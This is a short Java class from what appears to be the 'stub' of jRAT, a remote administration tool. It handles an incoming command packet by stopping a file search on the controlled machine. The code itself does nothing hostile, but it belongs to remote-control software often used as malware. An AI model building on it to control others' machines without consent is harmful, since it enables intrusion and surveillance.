package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		FileSearch.stopSearch();
	}

}
